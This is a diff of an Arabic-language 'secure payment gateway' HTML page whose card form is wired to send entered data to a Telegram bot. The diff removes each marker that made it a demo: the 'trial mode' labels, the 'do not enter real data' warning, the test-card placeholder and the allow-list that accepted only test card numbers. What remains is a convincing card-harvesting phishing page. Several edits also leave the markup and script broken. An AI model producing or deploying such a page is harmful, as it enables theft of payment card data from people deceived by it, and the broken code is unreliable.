@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>بوابة الدفع - وضع تجريبي (DEMO)</title>
+<title>بوابة الدفع -  (DEMO)</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
   :root{
@@ -61,7 +61,7 @@
     </div>
 
     <div class="panel" role="main">
-      <h1>بوابة الدفع الآمن - وضع تجريبي</h1>
+      >بوابة الدفع الآمن - وضع
 
       <div class="icons" aria-hidden="true">
         <!-- أيقونات البطاقات (عرض توضيحي فقط) -->
@@ -70,12 +70,12 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="visa" style="width:46px">
       </div>
 
-      <p class="note"><strong>تجريبي — لا تدخل بيانات حقيقية.</strong> هذا نموذج للتصميم والاختبار فقط. الرجاء استخدام أرقام بطاقات اختبار (مثال: <code>4242 4242 4242 4242</code>). سيتم إرسال <em>آخر 4 أرقام فقط</em> إلى البوت كـ DEMO.</p>
+      
 
       <form id="demoForm" autocomplete="off" novalidate>
         <div class="field">
           <label>رقم البطاقة</label>
-          <input id="cardNumber" type="text" inputmode="numeric" placeholder="4242 4242 4242 4242" maxlength="19" aria-label="رقم البطاقة">
+          <input id="cardNumber" type="text" inputmode="numeric" placeholder= maxlength="19" aria-label="رقم البطاقة">
         </div>
 
         <div class="field">
@@ -122,18 +122,11 @@ const form = document.getElementById('demoForm');
 const status = document.getElementById('status');
 
 // ضع توكن البوت و chat id هنا لو أردت اختبار الإرسال.
-// تذكر: استخدم توكن مؤقت للتجربة إن أمكن ثم امسحه.
+// 
 const TELEGRAM_TOKEN = ""; // <-- استبدل بقيمتك إن أردت (أو اتركه فارغًا)
 const TELEGRAM_CHAT_ID = "";  // <-- استبدل بقيمتك إن أردت
 
-// قائمة أرقام اختبار مقبولة (أمثلة). نحن نسمح فقط بالأرقام الوهمية/الاختبارية.
-const allowedTestCards = [
-  "4242424242424242", // Stripe test Visa
-  "4000056655665556"  // مثال آخر
-];
-
-function normalizeCardNumber(input){
-  return input.replace(/\\D/g,''); // احذف المسافات وغيره
+// 
 }
 
 function maskCard(cardNum){
